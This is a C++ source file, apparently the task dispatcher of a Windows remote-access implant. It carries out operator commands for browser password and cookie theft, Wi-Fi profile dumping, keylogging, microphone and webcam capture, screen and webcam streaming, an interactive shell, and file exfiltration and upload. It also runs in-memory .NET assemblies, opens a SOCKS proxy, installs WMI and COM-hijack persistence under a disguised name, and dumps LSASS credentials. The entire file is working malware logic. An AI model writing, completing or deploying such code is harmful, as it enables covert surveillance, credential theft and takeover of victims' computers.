#include "TaskDispatcher.h"
#include "Beacon.h"
#include "../recon/SysInfo.h"
#include "../recon/InstalledSoftware.h"
#include "../wifi/WifiDumper.h"
#include "../credential/ChromiumStealer.h"
#include "../credential/FirefoxStealer.h"
#include "../capture/Screenshot.h"
#include "../capture/Keylogger.h"
#include "../capture/Audio.h"
#include "../capture/Webcam.h"
#include "../streaming/Streamer.h"
#include "../shell/InteractiveShell.h"
#include "../execution/DotNetExecutor.h"
#include "../persistence/WmiPersistence.h"
#include "../persistence/ComHijacker.h"
#include "../credential/LsassDumper.h"
#include <stdexcept>

namespace beacon {

TaskDispatcher::TaskDispatcher(moodycamel::ConcurrentQueue<Result>& pendingResults)
    : pendingResults_(pendingResults) {}

void TaskDispatcher::dispatch(const Task& task) {
    Result result;
    result.task_id = task.task_id;

    try {
        switch (task.type) {
            case TaskType::SYSINFO:
                result.output = recon::getSysInfo();
                break;
            case TaskType::INSTALLED_APPS:
                result.output = recon::getInstalledSoftware();
                break;
            case TaskType::WIFI_DUMP:
                result.output = wifi::dumpWifiProfiles() + "\n\n" + wifi::scanAvailableWifi();
                break;
            case TaskType::BROWSER_PASS:
                result.output = credential::DumpChromiumPasswords();
                result.output += "\n\n" + credential::DumpFirefoxPasswords();
                break;
            case TaskType::COOKIE_STEAL:
                result.output = credential::StealFirefoxCookies(); 
                break;
            case TaskType::SCREENSHOT: {
                std::vector<BYTE> jpg = capture::CaptureScreenshotJPEG();
                if (jpg.empty()) throw std::runtime_error("Screenshot capture failed");
                result.output = "SCREENSHOT:" + crypto::Base64Encode(jpg);
                break;
            }
            case TaskType::KEYLOG:
                if (task.cmd == "start") {
                    capture::StartKeylogger();
                    result.output = "Keylogger started";
                } else if (task.cmd == "stop") {
                    capture::StopKeylogger();
                    result.output = "Keylogger stopped";
                } else if (task.cmd == "dump") {
                    result.output = capture::GetAndClearKeylog();
                }
                break;
            case TaskType::MIC: {
                int seconds = 5;
                try { seconds = std::stoi(task.cmd); } catch(...) {}
                std::vector<BYTE> wav = capture::RecordAudio(seconds);
                result.output = "AUDIO:" + crypto::Base64Encode(wav);
                break;
            }
            case TaskType::WEBCAM: {
                std::vector<BYTE> img = capture::CaptureWebcamImage();
                if (img.empty()) result.error = "Webcam capture failed (or camera not found)";
                else result.output = "WEBCAM:" + crypto::Base64Encode(img);
                break;
            }
            case TaskType::SCREEN_STREAM: {
                // Cmd: "start [duration]" or "stop"
                std::string cmd = task.cmd;
                if (cmd.find("start") == 0) {
                    int duration = 0;
                    try {
                        size_t space = cmd.find(' ');
                        if (space != std::string::npos) duration = std::stoi(cmd.substr(space + 1));
                    } catch(...) {}
                    
                    // define callback
                    auto cb = [this](const std::string& tid, const std::string& out) {
                         Result r; r.task_id = tid; r.output = out;
                         this->pendingResults_.enqueue(r);
                    };
                    streaming::StartScreenStream(duration, task.task_id, cb);
                    result.output = "SCREEN_STREAM_STATUS:Screen stream started";
                } else if (cmd == "stop") {
                    streaming::StopScreenStream();
                    result.output = "SCREEN_STREAM_STATUS:Screen stream stopped";
                }
                break;
            }
            case TaskType::WEBCAM_STREAM: {
                 std::string cmd = task.cmd;
                if (cmd.find("start") == 0) {
                    int duration = 0;
                     try {
                        size_t space = cmd.find(' ');
                        if (space != std::string::npos) duration = std::stoi(cmd.substr(space + 1));
                    } catch(...) {}
                    
                    auto cb = [this](const std::string& tid, const std::string& out) {
                         Result r; r.task_id = tid; r.output = out;
                         this->pendingResults_.enqueue(r);
                    };
                    streaming::StartWebcamStream(duration, task.task_id, cb);
                    result.output = "SWEBCAM_STREAM_STATUS:Webcam stream started";
                } else if (cmd == "stop") {
                    streaming::StopWebcamStream();
                    result.output = "SWEBCAM_STREAM_STATUS:Webcam stream stopped";
                }
                break;
            }
            case TaskType::ISHELL: {
                if (task.cmd == "start") {
                    auto cb = [this](const std::string& out) {
                        Result r; 
                        r.task_id = "ishell_out"; // usually irrelevant as C2 matches by type or context, but let's be consistent if possible. 
                        // Actually Python uses "output": "ISHELL_OUTPUT:\n..." inside the result of the *original* task for single cmds, 
                        // OR asynchronous pushes for the persistently running shell.
                        // Python sample pushes to `shell_output_queue` which is read by `handle_task` for "input" commands? 
                        // Wait, looking at Python: `start_interactive_shell` spawns thread that pushes to `shell_output_queue`. 
                        // Then `handle_task` with `ISHELL` and valid cmd waits for queue.
                        // Impl: We can just PUSH results asynchronously as they come! 
                        // "ISHELL_OUTPUT:<data>" is what server expects.
                        r.output = "ISHELL_OUTPUT:\n" + out;
                        this->pendingResults_.enqueue(r);
                    };
                    shell::StartShell(cb);
                    result.output = "ISHELL_STATUS:Interactive shell started";
                } else if (task.cmd == "exit") {
                    shell::StopShell();
                    result.output = "ISHELL_STATUS:Interactive shell terminated";
                } else {
                    // It's a command input
                    if (shell::IsShellRunning()) {
                        shell::WriteToShell(task.cmd);
                        // Output comes via callback asynchronously
                        result.output = "ISHELL_OUTPUT:"; // Ack
                    } else {
                        result.error = "Shell not started";
                    }
                }
                break;
            }
            case TaskType::DEEP_RECON:
                result.output = recon::GetDeepRecon();
                break;
            case TaskType::BROWSE_FS:
                result.output = fs::Browse(task.cmd);
                break;
            case TaskType::FILE_DOWNLOAD: {
                std::vector<BYTE> data = fs::ReadFileBinary(task.cmd);
                if (data.empty()) result.error = "File not found or empty";
                else {
                    // Python chunks large files. Here we send it in one go or we would need a more complex chunking logic.
                    // For now, base64 encode and send.
                    result.output = "FILE_DOWNLOAD:" + std::string(std::filesystem::path(task.cmd).filename().string()) + ":" + crypto::Base64Encode(data);
                }
                break;
            }
            case TaskType::FILE_UPLOAD: {
                // Cmd format: "path:base64data"
                size_t colon = task.cmd.find(':');
                if (colon != std::string::npos) {
                    std::string path = task.cmd.substr(0, colon);
                    std::string b64 = task.cmd.substr(colon + 1);
                    std::vector<BYTE> data = crypto::Base64Decode(b64);
                    if (fs::WriteFileBinary(path, data)) {
                        result.output = "Uploaded " + path;
                    } else {
                        result.error = "Failed to write file";
                    }
                } else {
                    result.error = "Invalid upload command format";
                }
                break;
            }
            case TaskType::EXECUTE_ASSEMBLY: {
                // Cmd format: "b64_assembly:arg1 arg2 arg3"
                size_t colon = task.cmd.find(':');
                if (colon != std::string::npos) {
                    std::string b64 = task.cmd.substr(0, colon);
                    std::string argsStr = task.cmd.substr(colon + 1);
                    
                    std::vector<uint8_t> assembly = crypto::Base64Decode(b64);
                    
                    // Split args (simple space-split for now)
                    std::vector<std::wstring> args;
                    std::wstringstream ss(std::wstring(argsStr.begin(), argsStr.end()));
                    std::wstring arg;
                    while (ss >> arg) args.push_back(arg);

                    execution::DotNetExecutor executor;
                    result.output = executor.Execute(assembly, args);
                } else {
                    result.error = "Invalid execute-assembly format (expected b64:args)";
                }
                break;
            }
            case TaskType::SOCKS_PROXY: {
                // Cmd format: "start [port]" or "stop"
                if (task.cmd.find("start") == 0) {
                    int port = 1080;
                    try {
                        size_t space = task.cmd.find(' ');
                        if (space != std::string::npos) port = std::stoi(task.cmd.substr(space + 1));
                    } catch(...) {}
                    
                    if (m_socksProxy.Start(port)) {
                        result.output = "SOCKS_PROXY_STATUS:Started on port " + std::to_string(port);
                    } else {
                        result.error = "Failed to start SOCKS proxy (already running or port busy)";
                    }
                } else if (task.cmd == "stop") {
                    m_socksProxy.Stop();
                    result.output = "SOCKS_PROXY_STATUS:Stopped";
                }
                break;
            }
            case TaskType::ADV_PERSISTENCE: {
                // Cmd format: "wmi install [name]" or "com install [clsid]"
                std::string cmd = task.cmd;
                char implantPath[MAX_PATH];
                GetModuleFileNameA(NULL, implantPath, MAX_PATH);

                if (cmd.find("wmi install") == 0) {
                    std::string name = "BenninUpdate";
                    if (cmd.length() > 12) name = cmd.substr(12);
                    if (persistence::WmiPersistence::Install(implantPath, name))
                        result.output = "ADV_PERSISTENCE:WMI installed as " + name;
                    else result.error = "WMI install failed";
                } else if (cmd.find("com install") == 0) {
                    std::string clsid = "{00021400-0000-0000-C000-000000000046}"; // Folder Background
                    if (cmd.length() > 12) clsid = cmd.substr(12);
                    if (persistence::ComHijacker::Install(implantPath, clsid))
                        result.output = "ADV_PERSISTENCE:COM hijacking installed for " + clsid;
                    else result.error = "COM install failed";
                }
                break;
            }
            case TaskType::DUMP_LSASS: {
                std::vector<BYTE> dump = credential::LsassDumper::Dump();
                if (dump.empty()) result.error = "LSASS dump failed (admin/debug priv required)";
                else {
                    result.output = "FILE_DOWNLOAD:lsass.dmp:" + crypto::Base64Encode(dump);
                }
                break;
            }
            // Add other task types here as they are implemented
            default:
                result.error = "Unknown or unsupported task type.";
                break;
        }
    } catch (const std::exception& e) {
        result.error = e.what();
    }

    pendingResults_.enqueue(result);
}

} // namespace beacon
